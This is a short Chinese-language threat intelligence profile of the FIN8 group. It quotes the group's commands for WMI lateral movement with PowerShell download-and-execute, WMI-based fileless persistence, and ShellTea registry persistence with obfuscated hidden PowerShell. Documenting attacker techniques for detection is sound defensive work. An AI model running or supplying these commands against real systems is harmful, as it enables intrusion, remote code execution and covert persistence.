# FIN8

## 特征

1. 横向移动时使用WMI进行远程命令执行:wmic.exe /node:<target> process call create "cmd /c powershell.exe -nop -ep bypass -c $pw='b640a9c0e64704e1e202a07774613a29971fe5aa';$pa='sys';iex (New-Object System.Net.WebClient).DownloadString('https://Url地址/134af6')"，其中$pw用来解密下载的脚本文件，$pa为模拟令牌说明，会注入svchost.exe -k netsvcs运行的进程，最后通过IEX下载文件.

2. 通过WMI创建触发器来保持持久性，使用命令:cmd.exe /Q /c powershell.exe -nop -ep bypass -c C:\sldr.ps1 B4a0f3AE251b7689CFdDe1 1> \\127.0.0.1\ADMIN$\__1621898828.3311949 2>&1,在WMI中创建三个对象来保证持久。sldr.ps1脚本包含了一个RC4加密的字符串，B4a0f3AE251b7689CFdDe1则为解密的密钥.其中创建的第二个对象会通过无文件的方式加载到内存中，并通过StartCheck()执行静态方法powershell.exe -nop -c [System.Reflection.Assembly]::Load(([WmiClass]'root\cimv2:Win32_Base64Class').Properties['Prop'].Value);[MSDAC.PerfOSChecker]::StartCheck().

3. ShellTea恶意软件会在注册表HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run中存在，而且会滥用通配符使其匹配Software降低检测.

```bash
"C:\\Windows\\System32\\cmd.exe '/c' 'powershell.exe' '-w' '1' '-nop' '-c ' 'start-process powershell.exe -windowstyle hidden -arg '-nop -c $a=(Get-ItemProperty registry::HKCU\\S???ware\\Fpkakesude);IEX $a.Xshuzugewogazi ' '"
```
